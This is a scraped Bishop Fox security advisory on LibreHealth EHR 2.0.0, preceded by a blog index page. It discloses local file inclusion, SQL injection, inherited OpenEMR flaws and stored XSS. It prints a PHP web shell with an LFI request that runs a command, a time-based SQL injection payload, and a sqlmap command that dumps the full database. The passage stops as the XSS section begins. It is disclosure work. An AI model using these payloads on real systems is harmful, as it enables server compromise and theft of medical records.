=== Content from know.bishopfox.com_c502d587_20250119_124414.html ===


Cosmos

[Services](https://bishopfox.com/services)

[Resources](https://bishopfox.com/resource-center)

[Customers](https://bishopfox.com/customers)

[Partners](https://bishopfox.com/partners)

[About Us](https://bishopfox.com/company)

[Get Started](https://bishopfox.com/get-started)

![](https://assets.bishopfox.com/prod-1437/Images/gigaom-badge-2024-ASM-leader.png)

Introducing Cosmos

### Named Leader of the GigaOm Radar for the third year in a row!

[Request A Demo](https://bishopfox.com/request-demo)

[Cosmos Overview](/cosmos)

Meet Cosmos: The continuous offensive security solution designed to provide proactive defense.

[Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)

Get Cosmos Attack Surface Management (CASM) for unmatched visibility into your changing external attack surface with continuous discovery and mapping.

[Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)

Cosmos Application Penetration Testing (CAPT) strengthens the security of business-critical applications with in-depth assessments.

[Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

Cosmos External Penetration Testing (CEPT) builds on Cosmos Attack Surface Management to provide the highest level of attack surface protection with post-exploitation activities.

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/poly-fox-graphic.png)

The Best Defense is a Great Offense

### See Why We're the Leaders in Offensive Security

[Explore Services](https://bishopfox.com/services)

[Application Security](/services/application-security)

Ensure your applications are secure and improve your DevSecOps practices.

* [Application Pen Testing](/services/application-penetration-testing)
* [Hybrid App Assessment](/services/hybrid-application-assessment)
* [Mobile App Assessment](/services/mobile-application-assessment)
* [View More](/services/application-security)

[Red Team & Readiness](/services/red-teaming)

Get a holistic view of your ability to defend against a real-world attack.

* [Social Engineering](/services/social-engineering)
* [Incident Response Tabletop Exercise](/services/tabletop-exercise)
* [Ransomware Readiness](/services/ransomware-readiness)

[IoT & Product Security](/services/product-security-review)

Validate interconnected devices and products are secure against attackers.

[Cloud Security](/services/cloud-penetration-testing)

Assess cloud security posture with expert testing and analysis of your environment.

[Network Security](/services/network-security)

Get insight into how skilled adversaries could establish network access and put sensitive systems and data at risk.

* [External Pen Testing](/services/external-penetration-testing)
* [Internal Pen Testing](/services/internal-penetration-testing)

[AI/ML Security Assessment](/services/ai-ml-security-assessment)

Fortify the security of rapidly evolving AI/ML applications, models, and supporting infrastructures.

[Compliance & Regulations](/services/compliance-and-frameworks)

Satisfy governance, risk, and compliance programs with our testing services.

[Assessments for Our Partners](/services/vendor-assessments)

We're proud to work with Google, Facebook, and Amazon to increase security in their partner ecosystems.

* [Cloud App Security Assessments (CASA)](/services/casa)
* [Meta Workplace Assessments](/services/facebook-partner-assessment)
* [Amazon Alexa Assessments](/services/amazon-alexa-built-in-device-assessment)
* [Oracle Security Assessments](/services/oracle-security-assessment)
* [View More](/services/vendor-assessments)

![](https://assets.bishopfox.com/prod-1437/Images/pages/campaign-lander-images/2023-Ponemon-Report/Ponemon-Report-Tablet_Plus-Pages-copy.png)

A Ponemon Institute Report

### The State of Offensive Security

Get the blueprint. Insights into how mature security organizations invest in offensive strategies.

[Get the Report](https://bishopfox.com/ponemon-2023-report)

[Resource Center](/resource-center)

Discover new offensive security resources, ranging from reports and eBooks to slide decks from speaking gigs.

* [Webcasts](/resources/webcasts)
* [Reports](/resources/reports)
* [eBooks & Guides](/resources/guides)
* [Cybersecurity Style Guide](/cybersecurity-style-guide)
* [View All](/resources)

[Bulletins & Advisories](/blog/advisories)

Explore the latest security bulletins and advisories released by our team.

* [Exploit for Fortinet CVE-2022-42475](/blog/exploit-cve-2022-42475)
  Latest
* [View All](/blog/advisories)

[Blog](/blog)

Dive into our blog for insights and perspectives from our offensive security experts.

* [Industry](/blog/industry)
* [Technology](/blog/technology)
* [Product](/blog/product)

[Bishop Fox Labs](/labs)

Learn more about our research and some of the most popular open-source security tools. Check them out here!

* [Hacking Tools](/tools)
* [Training Sessions](/resources/livestream)

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/Tag-Cyber-Independent-Assessment-Feature-Transparent.png)

Why Partner with Us?

### Join Forces with the Leaders in Offensive Security

Independent Assessment by TAG Cyber

[Get the Report](https://bishopfox.com/resources/tag-cybers-report-cast-platform)

[Partner Program Overview](/partners)

Learn about our partner programs and see how we can work together to provide best-in-class security offerings.

[Find a Partner](/partner-directory)

Check out our awesome ecosystem of trusted partners to find the right solution for your needs.

[Become a Partner](/partners/become-a-partner)

Explore partnership opportunities and apply to join forces with Bishop Fox.

[Assessments for Our Partners](/services/vendor-assessments)

We're proud to work with Google, Facebook, and Amazon to increase the security of their partner ecosystems.

* [Cloud Application Security Assessments](/services/casa)
* [Mobile Application Security Assessment](/services/masa)
* [Nest Assessments](/services/nest-partner-security-assessment)
* [Meta Workplace Assessments](/services/facebook-partner-assessment)
* [Amazon Alexa Assessments](/services/amazon-alexa-built-in-device-assessment)

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/hero-fox.png)

We're Hiring!

### Want to Work with the Best Minds in Offensive Security?

Be part of an elite team and work on projects that have a real impact.

[Explore Openings](https://bishopfox.com/careers)

[Company Overview](/company)

Get to know us. Learn about our roots and see why we're on a mission to improve security for all.

[Events](/events)

Join us at an upcoming event or peruse our speaking engagements, past and present.

[Newsroom](/news)

Read the latest articles, announcements, and press releases from Bishop Fox.

[Contact Us](/contact)

Want to get in touch? We're ready to connect.

[Career Opportunities](/careers)

We're hiring! Explore our open positions and discover why the Fox Den is a great place to build your career.

[Intern & Educational Programs](/company/internships)

Starting your offensive security journey? Check out our internships and educational programs.

[Bishop Fox Mexico](/mexico)

¡Celebramos! Bishop Fox is now in Mexico. Learn more about our expansion.

![bishopfox-mexico-logo](/static/assets/images/main-menu/bishopfox-mexico-logo.png)

Search

Cosmos

* Overview
* [Cosmos Overview](/cosmos)
* [Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)
* [Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)
* [Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

[Services](https://bishopfox.com/services)

* [Overview](https://bishopfox.com/services)
* [Application Security](/services/application-security)
* [Red Team & Readiness](/services/red-teaming)
* [IoT & Product Security](/services/product-security-review)
* [Cloud Security](/services/cloud-penetration-testing)
* [Network Security](/services/network-security)
* [AI/ML Security Assessment](/services/ai-ml-security-assessment)
* [Compliance & Regulations](/services/compliance-and-frameworks)
* [Assessments for Our Partners](/services/vendor-assessments)

[Resources](https://bishopfox.com/resource-center)

* [Overview](https://bishopfox.com/resource-center)
* [Resource Center](/resource-center)
* [Bulletins & Advisories](/blog/advisories)
* [Blog](/blog)
* [Bishop Fox Labs](/labs)

[Customers](https://bishopfox.com/customers)

[Partners](https://bishopfox.com/partners)

* [Overview](https://bishopfox.com/partners)
* [Partner Program Overview](/partners)
* [Find a Partner](/partner-directory)
* [Become a Partner](/partners/become-a-partner)
* [Assessments for Our Partners](/services/vendor-assessments)

[About Us](https://bishopfox.com/company)

* [Overview](https://bishopfox.com/company)
* [Company Overview](/company)
* [Events](/events)
* [Newsroom](/news)
* [Contact Us](/contact)
* [Career Opportunities](/careers)
* [Intern & Educational Programs](/company/internships)
* [Bishop Fox Mexico](/mexico)

[Get Started](https://bishopfox.com/get-started)

Search

### Featured Advisory

## raink: Use LLMs for Document Ranking

Learn how Bishop Fox's open-source ranking algorithm, raink, can be used to solve general ranking problems that are difficult for LLMs to process.
[Read More](https://bishopfox.com/blog/raink-llms-document-ranking)

[![Bishop Fox Blog RAINK Featured](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/BishopFox-Blog-RAINK-F.jpg)](https://bishopfox.com/blog/raink-llms-document-ranking)

Search

Searching...

Showing 0 of

Show All

No results found for ""

[All](https://bishopfox.com/blog)
[Industry](https://bishopfox.com/blog/industry)
[Tech](https://bishopfox.com/blog/technology)
[Advisories](https://bishopfox.com/blog/advisories)
[Product](https://bishopfox.com/blog/product)

[![Blog title and category: Vulnerability Intelligence Current State of SonicWall Exposure: Firmware Decryption Unlocks New Insights](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/Featured_Tile_2024-12-12-205929_kppy.jpg)

Tech

Dec 13, 2024

Current State of SonicWall Exposure: Firmware Decryption Unlocks New Insights

By
Bishop Fox](https://bishopfox.com/blog/state-sonicwall-exposure-firmware-decryption-unlocks-insights)
[![Blog title and category: Vulnerability Intelligence for SonicWall Firmware Deep Dive on SWI firmware decryption.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/SonicWall-hadware-part1_Featured_Tile.jpg)

Tech

Dec 02, 2024

Sonicwall Firmware Deep Dive - Part 1

By
Bishop Fox](https://bishopfox.com/blog/sonicwall-firmware-deep-dive-part-1)
[![Vulnerabilty Intelligence series with blog post title.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/Bishop-Fox-Blog-Fortijump.jpg)

Tech

Nov 01, 2024

A Brief Look at FortiJump (FortiManager CVE-2024-47575)

By
Bishop Fox](https://bishopfox.com/blog/a-look-at-fortijump-cve-2024-47575)
[![Gauge showing high severity reading for a security advisory for EzAdsPro “BlackBox” application.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/High-Risk-Advisory-Featured.jpg)

Advisory

Jul 02, 2024

Traeger Grill D2 Wi-Fi Controller, Version 2.02.04

By
Nick Cerne](https://bishopfox.com/blog/traeger-wifi-controller-advisory)
[![Gauge showing high severity reading for a security advisory for EzAdsPro “BlackBox” application.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/High-Risk-Advisory-Featured.jpg)

Advisory

Jun 17, 2024

ExpressionEngine, Version 7.3.15

By
Matthieu Keller](https://bishopfox.com/blog/expressionengine-v-7-3-15-vulnerability)
[![Gauge showing high severity reading. CATIE Web - Version 20.04.0.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/High-Risk-Advisory-Featured.jpg)

Advisory

May 06, 2024

OOB Memory Read: Netscaler ADC and Gateway

By
Bishop Fox](https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory)

Subscribe to Bishop Fox's Security Blog

Be first to learn about latest tools, advisories, and findings.

Thank You! You have been subscribed.

[![Security Vulnerability Gauge showing a critical severity reading.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/Critical-Risk-Advisory-Featured.jpg)

Advisory

Nov 27, 2023

Ray, Versions 2.6.3, 2.8.0

By
Berenice Flores Garcia](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
[![Gauge showing high severity reading for a security advisory for EzAdsPro “BlackBox” application.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/High-Risk-Advisory-Featured.jpg)

Advisory

Jun 20, 2023

TaskCafe, Version 0.3.2 Advisory

By
Joan Bono,
Luis De la Rosa Hernandez](https://bishopfox.com/blog/taskcafe-version-0-3-2-advisory)
[![Gauge showing high severity reading for a security advisory for EzAdsPro “BlackBox” application.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/High-Risk-Advisory-Featured.jpg)

Advisory

Apr 13, 2023

WP Coder, Version 2.5.3 Advisory

By
Etan Castro Aldrete](https://bishopfox.com/blog/wp-coder-version-2-5-3-advisory)
[![Gauge with medium severity reading for FlowscreenComponents Basepack, Version 3.0.7 Advisory. Mautic Version <=3.2.2 Advisory. eCatcher Desktop, Version 6.6.4 Advisory.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/Medium-Risk-Advisory-Featured.jpg)

Advisory

Apr 04, 2023

Windows Task Scheduler Application, Version 19044.1706 Advisory

By
Ben Lincoln](https://bishopfox.com/blog/windows-task-scheduler-19044-advisory)
[![Security Vulnerability Gauge showing a low severity reading FileStack Upload Advisory](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/Low-Risk-Advisory-Featured.jpg)

Advisory

Apr 04, 2023

Microsoft Intune, Version 1.55.48.0 Advisory

By
Ben Lincoln](https://bishopfox.com/blog/microsoft-intune-version-1-55-48-0-advisory)
[![Gauge showing high severity reading for a security advisory for EzAdsPro “BlackBox” application.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/High-Risk-Advisory-Featured.jpg)

Advisory

Jan 25, 2023

EzAdsPro BlackBox Advisory

By
Dan Petro](https://bishopfox.com/blog/ezadspro-blackbox-advisory)

[Load More](https://bishopfox.com/blog/advisories?page=2)

1
[2](https://bishopfox.com/blog/advisories?page=2)
[3](https://bishopfox.com/blog/advisories?page=3)
[4](https://bishopfox.com/blog/advisories?page=4)
[5](https://bishopfox.com/blog/advisories?page=5)
[6](https://bishopfox.com/blog/advisories?page=6)
[Next](https://bishopfox.com/blog/advisories?page=2)

* [Cosmos Platform](/cosmos)
* [Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)
* [Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)
* [Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

* [Services](/services)
* [Application Security](/services/application-security)
* [Cloud Security](/services/cloud-penetration-testing)
* [IoT & Product Security](/services/product-security-review)
* [Network Security](/services/network-security)
* [Red Team & Readiness](/services/red-teaming)
* [Compliance, Regulations, & Frameworks](/services/compliance-and-frameworks)
* [Google, Facebook, & Amazon Partner Assessments](/services/vendor-assessments)

* [Resources](/resources)
* [Resource Center](/resource-center)
* [Blog](/blog)
* [Advisories](/blog/advisories)
* [Tools](/tools)

* [Our Customers](/customers)
* [Our Customer Stories](/resources/customer-stories)

* [Partners](/partners)
* [Partner Programs](/partners)
* [Partner Directory](/partner-directory)
* [Become a Partner](/partners/become-a-partner)

* [Company](/company)
* [About Us](/company)
* [Careers
  We're Hiring](/careers)
* [Events](/events)
* [Newsroom](/news)
* [Bishop Fox Mexico](/mexico)
* [Bishop Fox Labs](/labs)
* [Contact Us](/contact)

Copyright © 2025 Bishop Fox

[Privacy Statement](https://bishopfox.com/privacy-statement)
[Responsible Disclosure Policy](https://bishopfox.com/vulnerability-disclosure-policy)

This site uses cookies to provide you with a great user experience. By continuing to use our website, you consent to the use of cookies. To find out more about the cookies we use, please see our [Privacy Policy](https://bishopfox.com/privacy-statement).

Accept



=== Content from labs.bishopfox.com_5b66497f_20250119_124416.html ===


Cosmos

[Services](https://bishopfox.com/services)

[Resources](https://bishopfox.com/resource-center)

[Customers](https://bishopfox.com/customers)

[Partners](https://bishopfox.com/partners)

[About Us](https://bishopfox.com/company)

[Get Started](https://bishopfox.com/get-started)

![](https://assets.bishopfox.com/prod-1437/Images/gigaom-badge-2024-ASM-leader.png)

Introducing Cosmos

### Named Leader of the GigaOm Radar for the third year in a row!

[Request A Demo](https://bishopfox.com/request-demo)

[Cosmos Overview](/cosmos)

Meet Cosmos: The continuous offensive security solution designed to provide proactive defense.

[Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)

Get Cosmos Attack Surface Management (CASM) for unmatched visibility into your changing external attack surface with continuous discovery and mapping.

[Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)

Cosmos Application Penetration Testing (CAPT) strengthens the security of business-critical applications with in-depth assessments.

[Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

Cosmos External Penetration Testing (CEPT) builds on Cosmos Attack Surface Management to provide the highest level of attack surface protection with post-exploitation activities.

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/poly-fox-graphic.png)

The Best Defense is a Great Offense

### See Why We're the Leaders in Offensive Security

[Explore Services](https://bishopfox.com/services)

[Application Security](/services/application-security)

Ensure your applications are secure and improve your DevSecOps practices.

* [Application Pen Testing](/services/application-penetration-testing)
* [Hybrid App Assessment](/services/hybrid-application-assessment)
* [Mobile App Assessment](/services/mobile-application-assessment)
* [View More](/services/application-security)

[Red Team & Readiness](/services/red-teaming)

Get a holistic view of your ability to defend against a real-world attack.

* [Social Engineering](/services/social-engineering)
* [Incident Response Tabletop Exercise](/services/tabletop-exercise)
* [Ransomware Readiness](/services/ransomware-readiness)

[IoT & Product Security](/services/product-security-review)

Validate interconnected devices and products are secure against attackers.

[Cloud Security](/services/cloud-penetration-testing)

Assess cloud security posture with expert testing and analysis of your environment.

[Network Security](/services/network-security)

Get insight into how skilled adversaries could establish network access and put sensitive systems and data at risk.

* [External Pen Testing](/services/external-penetration-testing)
* [Internal Pen Testing](/services/internal-penetration-testing)

[AI/ML Security Assessment](/services/ai-ml-security-assessment)

Fortify the security of rapidly evolving AI/ML applications, models, and supporting infrastructures.

[Compliance & Regulations](/services/compliance-and-frameworks)

Satisfy governance, risk, and compliance programs with our testing services.

[Assessments for Our Partners](/services/vendor-assessments)

We're proud to work with Google, Facebook, and Amazon to increase security in their partner ecosystems.

* [Cloud App Security Assessments (CASA)](/services/casa)
* [Meta Workplace Assessments](/services/facebook-partner-assessment)
* [Amazon Alexa Assessments](/services/amazon-alexa-built-in-device-assessment)
* [Oracle Security Assessments](/services/oracle-security-assessment)
* [View More](/services/vendor-assessments)

![](https://assets.bishopfox.com/prod-1437/Images/pages/campaign-lander-images/2023-Ponemon-Report/Ponemon-Report-Tablet_Plus-Pages-copy.png)

A Ponemon Institute Report

### The State of Offensive Security

Get the blueprint. Insights into how mature security organizations invest in offensive strategies.

[Get the Report](https://bishopfox.com/ponemon-2023-report)

[Resource Center](/resource-center)

Discover new offensive security resources, ranging from reports and eBooks to slide decks from speaking gigs.

* [Webcasts](/resources/webcasts)
* [Reports](/resources/reports)
* [eBooks & Guides](/resources/guides)
* [Cybersecurity Style Guide](/cybersecurity-style-guide)
* [View All](/resources)

[Bulletins & Advisories](/blog/advisories)

Explore the latest security bulletins and advisories released by our team.

* [Exploit for Fortinet CVE-2022-42475](/blog/exploit-cve-2022-42475)
  Latest
* [View All](/blog/advisories)

[Blog](/blog)

Dive into our blog for insights and perspectives from our offensive security experts.

* [Industry](/blog/industry)
* [Technology](/blog/technology)
* [Product](/blog/product)

[Bishop Fox Labs](/labs)

Learn more about our research and some of the most popular open-source security tools. Check them out here!

* [Hacking Tools](/tools)
* [Training Sessions](/resources/livestream)

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/Tag-Cyber-Independent-Assessment-Feature-Transparent.png)

Why Partner with Us?

### Join Forces with the Leaders in Offensive Security

Independent Assessment by TAG Cyber

[Get the Report](https://bishopfox.com/resources/tag-cybers-report-cast-platform)

[Partner Program Overview](/partners)

Learn about our partner programs and see how we can work together to provide best-in-class security offerings.

[Find a Partner](/partner-directory)

Check out our awesome ecosystem of trusted partners to find the right solution for your needs.

[Become a Partner](/partners/become-a-partner)

Explore partnership opportunities and apply to join forces with Bishop Fox.

[Assessments for Our Partners](/services/vendor-assessments)

We're proud to work with Google, Facebook, and Amazon to increase the security of their partner ecosystems.

* [Cloud Application Security Assessments](/services/casa)
* [Mobile Application Security Assessment](/services/masa)
* [Nest Assessments](/services/nest-partner-security-assessment)
* [Meta Workplace Assessments](/services/facebook-partner-assessment)
* [Amazon Alexa Assessments](/services/amazon-alexa-built-in-device-assessment)

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/hero-fox.png)

We're Hiring!

### Want to Work with the Best Minds in Offensive Security?

Be part of an elite team and work on projects that have a real impact.

[Explore Openings](https://bishopfox.com/careers)

[Company Overview](/company)

Get to know us. Learn about our roots and see why we're on a mission to improve security for all.

[Events](/events)

Join us at an upcoming event or peruse our speaking engagements, past and present.

[Newsroom](/news)

Read the latest articles, announcements, and press releases from Bishop Fox.

[Contact Us](/contact)

Want to get in touch? We're ready to connect.

[Career Opportunities](/careers)

We're hiring! Explore our open positions and discover why the Fox Den is a great place to build your career.

[Intern & Educational Programs](/company/internships)

Starting your offensive security journey? Check out our internships and educational programs.

[Bishop Fox Mexico](/mexico)

¡Celebramos! Bishop Fox is now in Mexico. Learn more about our expansion.

![bishopfox-mexico-logo](/static/assets/images/main-menu/bishopfox-mexico-logo.png)

Search

Cosmos

* Overview
* [Cosmos Overview](/cosmos)
* [Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)
* [Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)
* [Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

[Services](https://bishopfox.com/services)

* [Overview](https://bishopfox.com/services)
* [Application Security](/services/application-security)
* [Red Team & Readiness](/services/red-teaming)
* [IoT & Product Security](/services/product-security-review)
* [Cloud Security](/services/cloud-penetration-testing)
* [Network Security](/services/network-security)
* [AI/ML Security Assessment](/services/ai-ml-security-assessment)
* [Compliance & Regulations](/services/compliance-and-frameworks)
* [Assessments for Our Partners](/services/vendor-assessments)

[Resources](https://bishopfox.com/resource-center)

* [Overview](https://bishopfox.com/resource-center)
* [Resource Center](/resource-center)
* [Bulletins & Advisories](/blog/advisories)
* [Blog](/blog)
* [Bishop Fox Labs](/labs)

[Customers](https://bishopfox.com/customers)

[Partners](https://bishopfox.com/partners)

* [Overview](https://bishopfox.com/partners)
* [Partner Program Overview](/partners)
* [Find a Partner](/partner-directory)
* [Become a Partner](/partners/become-a-partner)
* [Assessments for Our Partners](/services/vendor-assessments)

[About Us](https://bishopfox.com/company)

* [Overview](https://bishopfox.com/company)
* [Company Overview](/company)
* [Events](/events)
* [Newsroom](/news)
* [Contact Us](/contact)
* [Career Opportunities](/careers)
* [Intern & Educational Programs](/company/internships)
* [Bishop Fox Mexico](/mexico)

[Get Started](https://bishopfox.com/get-started)

Search

[Blog](https://bishopfox.com/blog)
// [Advisories](https://bishopfox.com/blog/advisories)
// [Jul 14, 2020](https://bishopfox.com/blog/librehealth-version-2-0-0-0-advisory)

# LibreHealth Version 2.0.0

By:
[Chris Davis, Senior Security Consultant](https://bishopfox.com/authors/chris-davis)

![Gauge showing high severity reading](https://assets.bishopfox.com/prod-1437/Images/channels/blog/featured-images/High-Risk-Advisory-Featured.jpg)

Share

## ADVISORY SUMMARY

The following document describes identified vulnerabilities in the LibreHealth application version 2.0.0. Five high-risk issues were discovered that could be exploited to compromise the application server and sensitive health care records within the application.

## Impact

The discovered high-risk vulnerabilities would allow an unauthenticated malicious actor or low-privileged application user to compromise the application's underlying server and the data contained within the application. Because of the nature of the application, that data includes highly sensitive medical records and personally identifiable information (PII). The vulnerabilities consisted of a local file inclusion that could be leveraged to compromise the underlying application server, an SQL injection issue that resulted in sensitive data disclosure, an XSS issue that would allow attackers to force actions on other user's behalf, and a CSRF issue that would allow an attacker to perform any of the mentioned attacks from the context of an unauthenticated attacker via a phishing page. The LibreHealth application was also affected by previously discovered high-risk CVEs from its fork of a legacy OpenEMR codebase, which resulted in application server compromise.

## High Risk Level

## Affected Vendor

| **Product Vendor** | Product Name | Affected Version |
| --- | --- | --- |
| LibreHealth | LibreHealth EHR | 2.0.0 |

## Product Description

LibreHealth EHR is an electronic health records software solution that allows medical professionals to track health records of patients. The project’s official website is <https://librehealth.io/>. The latest version of the application is 2.0.0, released September 2017.

## Vulnerabilities List

Five high-risk vulnerabilities were identified within the LibreHealth EHR v2.0.0 application:

**[LOCAL FILE INCLUSION (LFI)](#INOR)

[SQL INJECTION](#SQL)

[VULNERABLE SOFTWARE](#VS)

[CROSS-SITE SCRIPTING (XSS)](#XSS)

[CROSS-SITE REQUEST FORGERY (CSRF)](#CSRF)**

## Solution

Although no official patched release is available at the time of writing, fixes are in progress and some are available as [unmerged pull requests on GitHub] <https://github.com/LibreHealthIO/lh-ehr/pulls>

These vulnerabilities are described in the following sections.

## VULNERABILITIES

## LOCAL FILE INCLUSION (LFI)

The LibreHealth EHR application was affected local file inclusion (LFI). This vulnerability allowed the execution of arbitrary PHP files within the application’s web root. The vulnerabilities could be exploited from the context of any authenticated user and would execute PHP code that existed within the application's web root.

| **CVE ID** | **Security Risk** | **Impact** | **Access Vector** |
| --- | --- | --- | --- |
| [CVE-2020-11439](https://nvd.nist.gov/vuln/detail/CVE-2020-11439) | High | Code execution | Remote |

A local file inclusion (LFI) vulnerability is present in the `url` parameter of the  `librehealthehr/interface/main/tabs/main.php` endpoint. This vulnerability allows the execution of arbitrary PHP files within the LibreHealth EHR application’s web root. The vulnerabilities could be exploited from the context of any authenticated user.

To demonstrate this LFI vulnerability, a PHP web shell was uploaded using a known insecure file upload vulnerability: [CVE-2018-1000649](https://www.cvedetails.com/cve/CVE-2018-1000649/). The contents of the uploaded file `webshell.php` are shown below:

```
<?php
if(isset($_GET['cmd']))
{
   system($_GET['cmd']);
}
?>
```

***Figure 1** - Uploaded PHP code*

Next, the path to the `webshell.php` file was included in the vulnerable `url` parameter. The `id` shell command was passed through the uploaded file’s `cmd` parameter, as shown below:

```
http://libre.test.mg.gy/librehealthehr/interface/main/tabs/main.php?url=../../sites/default/letter_templates/webshell.php?cmd=id
```

***Figure 2** - LFI request*

The uploaded file was loaded within the `main.php` endpoint and executed, as shown below:

![LFI code execution](https://know.bishopfox.com/hubfs/200713%20-%20Libre%20fig%203.png)

Figure 3 - LFI code execution

The LFI could be exploited by any authenticated user to execute any PHP code contained within the application web root.

## SQL INJECTION

The SQL injection vulnerabilities allowed attacker-controlled SQL queries to be performed that compromised the LibreHealth application's sensitive database contents (including medical records and user information. These vulnerabilities could be exploited by low-privileged authenticated users.

| **CVE ID** | **Security Risk** | **Impact** | **Access Vector** |
| --- | --- | --- | --- |
| [CVE-2020-11437](https://nvd.nist.gov/vuln/detail/CVE-2020-11437) | High | Information disclosure | Remote |

The `letter.php` endpoint was vulnerable to SQL injection in the `form_from` and `form_to` POST parameters. The root cause was found to be unsafe SQL string building in the `interface/patient_file/letter.php` source code, as shown below:

```
104. $frow = sqlQuery("SELECT * FROM users WHERE id = '$form_from'");
105. $trow = sqlQuery("SELECT * FROM users WHERE id = '$form_to'");
```

***Figure 4** - Code vulnerable to SQL injection*

Users can change the `$form_from` and `$form_to` parameters. After authenticating to the application with a user in the low-privileged`Front Desk` group, the following request was sent to verify the SQLi:

```
POST /librehealthehr/interface/patient_file/letter.php HTTP/1.1
Host: libre.test.mg.gy
…omitted for brevity…
formaction=generate&form_pid=158172491&form_from= <mark>7'+AND+(select+sleep(12))+#+</mark>'&form_date=2020-02-15&form_specialty=All&form_template=autosaved&form_to=4&form_format=html&form_body=%7BFROM_TITLE%7D%7BFROM_MNAME%7D&newtemplatename=
```

***Figure 5** - Request with SQL injection payload*

The application’s response was delayed by 12 seconds, indicating the SQLi was successful. To further exploit this SQLi vulnerability, the automated SQL injection tool sqlmap was used. The following command, `sql.txt`, contains the POST request from above:

```
sqlmap -l sql.txt --dbms=mysql -p form_from --dump
```

***Figure 6** - Command to extract database contents*

The tool successfully extracted the contents of the application database, as shown below:

![sqlmap database extraction](https://know.bishopfox.com/hubfs/200713%20-%20libre%20fig%207.jpg)

Figure 7 - sqlmap database extraction

The SQL injection was exploited to retrieve the complete contents of the MySQL application database, which included medical records and user information.

## VULNERABLE SOFTWARE

The LibreHealth EHR application was affected by vulnerable software because it is a form of an older OpenEMR version code base that contained known, un-remediated vulnerabilities. These vulnerabilities included multiple high-risk issues including PHP code injection, command injection, file path traversal, and XSS.

| **CVE ID** | **Security Risk** | **Impact** | **Access Vector** |
| --- | --- | --- | --- |
| N/A | High | Code execution | Other |

The LibreHealth EHR application is affected by known vulnerabilities affecting an outdated OpenEMR codebase, as well as unremediated issues in the LibreHealth EHR codebase. These vulnerabilities included multiple high-risk issues including PHP code injection, command injection, file path traversal, and XSS. This finding describes a subset of known vulnerabilities that were found to be present in the codebase, but it may not represent a comprehensive list of all outstanding vulnerabilities.

LibreHealth EHR used forked code from the OpenEMR project that was affected by the following known issues:

| **CVE ID** | **Vulnerability** | **Original Blog Post** |
| --- | --- | --- |
| CVE-2019-3963 throughCVE-2019-3966 | Cross-site Scripting | <https://www.tenable.com/security/research/tra-2019-40> |
| CVE-2019-3967 | Directory Traversal and Arbitrary File Download | <https://www.tenable.com/security/research/tra-2019-40> |
| CVE-2019-3968 | Command Injection | <https://www.tenable.com/security/research/tra-2019-40> |
| CVE-2019-8371 | PHP Injection (RCE) | <https://know.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting> |

***Figure 8** - Table of issues affecting the OpenEMR project that also affect LibreHealth EHR*

The above issues were verified to affect LibreHealth EHR, and their exploitation was identical to the OpenEMR advisories highlighted above. In addition to the vulnerabilities inherited from OpenEMR, LibreHealth EHR was affected by known issues that were publicly released in 2018, shown in the table below:

| **CVE ID** | **Vulnerability** | **Original Blog Post** |
| --- | --- | --- |
| CVE-2018-1000648 | Authenticated Unrestricted File Write | <https://0dd.zone/2018/08/07/lh-ehr-Authenticated-File-Write-Letter-PHP/> |
| CVE-2018-1000649 | Authenticated Unrestricted File Write (aka Insecure File Upload) | <https://0dd.zone/2018/08/07/lh-ehr-Authenticated-File-Write-Letter-PHP-2/> |
| CVE-2018-1000647 | Unrestricted File Deletion | <https://0dd.zone/2018/08/07/lh-ehr-Authenticated-File-Deletion/> |
| CVE-2018-1000646 | Authenticated Unrestricted File Write | <https://0dd.zone/2018/08/07/lh-ehr-Authenticated-File-Write/> |

***Figure 9** - Table of previously disclosed issues affecting LibreHealth EHR*

The previously disclosed issues from 2018 and the previous disclosed issues from the OpenEMR codebase still exist within the LibreHealth EHR application.

## CROSS-SITE SCRIPTING (XSS) >

The LibreHealth EHR application was affected by one instance of XSS. This XSS vulnerability was stored in the application and exploitable from the context of a low-privileged user. A proof-of-concept XSS payload caused server-side code execution when a user navigated to the affected endpoint.

| **CVE ID** | **Security Risk** | **Impact** | **Access Vector** |
| --- | --- | --- | --- |
| [CVE-2020-11436](https://nvd.nist.gov/vuln/detail/CVE-2020-11436) | High | Code execution, Escalation of privileges | Remote |

The `note` parameter of the `/librehealthehr/controller.php` endpoint is vulnerable to stored XSS and exploitable from the context of a low-privileged user. A proof-of-concept XSS payload was created to demonstrate server-side code execution when a user navigated to the affected endpoint.

